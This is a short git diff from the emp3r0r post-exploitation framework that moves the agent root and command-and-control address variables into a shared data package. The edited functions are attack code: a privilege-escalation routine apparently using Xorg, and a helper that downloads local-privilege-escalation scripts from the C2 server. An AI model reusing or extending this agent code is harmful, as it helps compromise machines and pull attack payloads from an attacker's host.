@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/creack/pty"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 )
 
 /*
@@ -28,9 +29,9 @@ func GetRootXorg(ctx context.Context, cancel context.CancelFunc) (err error) {
 	var out []byte
 	defer func() {
 		cancel()
-		e := os.Chdir(AgentRoot)
+		e := os.Chdir(emp3r0r_data.AgentRoot)
 		if e != nil {
-			log.Printf("failed to cd back to %s\n%v", AgentRoot, e)
+			log.Printf("failed to cd back to %s\n%v", emp3r0r_data.AgentRoot, e)
 		}
 	}()
 
@@ -81,9 +82,9 @@ func GetRootXorg(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 // lpeHelper runs les and upc to suggest LPE methods
 func lpeHelper(method string) string {
-	log.Printf("Downloading lpe script from %s", CCAddress+method)
+	log.Printf("Downloading lpe script from %s", emp3r0r_data.CCAddress+method)
 	var scriptData []byte
-	scriptData, err := DownloadViaCC(CCAddress+"www/"+method, "")
+	scriptData, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+method, "")
 	if err != nil {
 		return "LPE error: " + err.Error()
 	}
